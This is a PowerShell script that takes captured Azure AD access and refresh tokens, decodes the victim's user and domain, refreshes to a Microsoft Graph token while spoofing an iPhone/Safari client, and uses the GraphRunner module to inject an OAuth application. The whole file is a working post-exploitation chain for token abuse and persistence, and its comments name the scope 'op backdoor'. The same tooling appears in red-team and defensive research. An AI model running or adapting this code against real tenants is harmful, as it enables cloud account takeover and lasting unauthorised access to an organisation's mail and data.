[CmdletBinding()]
param(
    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string]
    $AppName,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string]
    $ReplyUrl,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string]
    $domain,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string[]]
    $Scope,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [PSCustomObject]
    $response
)

function New-TokensObject {
    param(
        [Parameter(Mandatory=$true)]
        [string]$AccessToken,
        
        [Parameter(Mandatory=$true)]
        [string]$RefreshToken
    )

    $tokens = New-Object PSObject -Property @{
        access_token = $AccessToken
        refresh_token = $RefreshToken
    }

    return $tokens
}


$access = $response.access_token
$refresh = $response.refresh_token

# Target details constructed from token   
$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]

$tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari



# Assuming $response is an object with access_token and refresh_token
if ($tokz) {
    $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
    # Output the tokens for verification (optional)
    Write-Host "Access Token from tokens object: $($tokens.access_token)"
    Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
}

# Refresh-ToMSGraph
Write-Host "Refreshing to MSGRaph for GraphRunner modules"



# Write-Host "Tokens: $tokens"

########################################################################
# Import the GraphRunner module
. .\GraphRunner.ps1

# Use the constructed $tokens object with GraphRunner functions
# Assuming Invoke-ImportTokens is a hypothetical function for demonstration
# Replace with actual usage based on GraphRunner module requirements
# Example:

Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token

$output = Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens

Write-Host "Injected OAuth app: $output"



# Invoke-InjectOAuthApp -AppName $appName -ReplyUrl "http://localhost:10000" -scope "op backdoor" -AccessToken $response.access_token 
# Invoke-InjectOAuthApp -AppName $appName -ReplyUrl "http://localhost:10000" -scope "op backdoor" -Tokens $response